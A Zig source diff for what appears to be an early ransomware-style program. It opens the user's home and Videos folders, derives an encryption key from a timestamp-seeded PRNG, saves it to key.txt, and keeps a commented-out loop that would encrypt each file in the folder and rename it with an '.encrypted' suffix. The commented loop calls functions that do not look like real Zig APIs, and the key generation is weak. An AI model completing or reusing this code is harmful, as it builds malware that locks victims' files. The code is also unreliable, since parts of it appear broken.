@@ -5,6 +5,7 @@ const mem = std.mem;
 const rand = std.rand;
 const algo = std.crypto.aead.chacha_poly.XChaCha20Poly1305;
 const kf = @import("known-folders");
+const KnownFolder = kf.KnownFolder;
 
 const keyFileName = "key.txt";
 
@@ -14,10 +15,11 @@ pub fn main() anyerror!void {
 
     const alloc = arena.allocator();
 
-    const iSeriouslyDontCareOmg = fs.Dir.OpenDirOptions{};
-    var homeFolder = try kf.open(alloc, kf.KnownFolder.home, iSeriouslyDontCareOmg);
-    var targetFolder = try kf.open(alloc, kf.KnownFolder.videos, iSeriouslyDontCareOmg);
-    _ = targetFolder;
+    const idc = fs.Dir.OpenDirOptions{};
+    var homeFolder = try kf.open(alloc, KnownFolder.home, idc) orelse return;
+    var targetFolder = try kf.open(alloc, KnownFolder.videos, idc) orelse return;
+    defer homeFolder.close();
+    defer targetFolder.close();
 
     // Generate a random key
     const timeArr: [8]u8 = @bitCast(std.time.milliTimestamp());
@@ -37,18 +39,15 @@ pub fn main() anyerror!void {
     prng.fill(&key);
 
     // Write the key to the key file
-    try homeFolder.?.writeFile(keyFileName, &key);
+    try homeFolder.writeFile(keyFileName, &key);
 
     // // Encrypt files in the folder
-    // const dir = try os.openDir(folderPath);
-    // defer dir.close();
-    //
     // while (true) |entry| {
     //     const entryName = entry.name() orelse break;
     //     if (entry.isDir()) continue;
     //
-    //     const filePath = try std.build.pathAppend(null, folderPath, entryName);
-    //     const encryptedFilePath = try std.build.pathAppend(null, folderPath, entryName ++ ".encrypted");
+    //     const filePath = try std.build.pathAppend(null, targetFolder, entryName);
+    //     const encryptedFilePath = try std.build.pathAppend(null, targetFolder, entryName ++ ".encrypted");
     //
     //     const file = try os.openFile(filePath, .{ .read = true });
     //     defer file.close();
